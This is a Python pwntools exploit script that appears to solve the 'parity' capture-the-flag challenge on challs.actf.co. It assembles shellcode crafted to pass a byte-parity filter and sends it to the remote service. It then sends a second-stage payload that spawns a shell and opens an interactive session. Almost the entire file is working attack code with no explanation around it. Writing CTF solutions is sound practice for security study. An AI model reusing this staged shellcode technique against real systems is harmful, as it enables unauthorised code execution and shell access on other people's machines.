#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ template template --host challs.actf.co --port 31226 parity
from pwn import *
from time import sleep

# Set up pwntools for the correct architecture
elf = context.binary = ELF('parity')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'challs.actf.co'
port = int(args.PORT or 31226)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([elf.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([elf.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak *main+255
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()

# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)

shellcode = asm('''
// 0 1 0 1
xor rax, 0x40-1
// 0 1 0
inc rax
// 1
cdq
// 0 1 0 1
shl rax, 7
// 0 1 0
shl rax, 1
// 1
cdq
// 0 1 0 1
xor rax, 9
// 0 1 0 1
add rax, 7

// 0 1 0 1
shl rax, 7
// 0 1 0
shl rax, 1

// 1
cdq
// 0 1 0 1
xor rax, 0x7f
add rax, 0x75
xor rdx, 0x71
// 0
nop
// 1 0
call rax
''')
print(hexdump(shellcode))
io.send(shellcode)
sleep(5)
payload = fit({
     len(shellcode): asm(shellcraft.sh())
    })
print(hexdump(payload))
io.send(payload)
io.interactive()

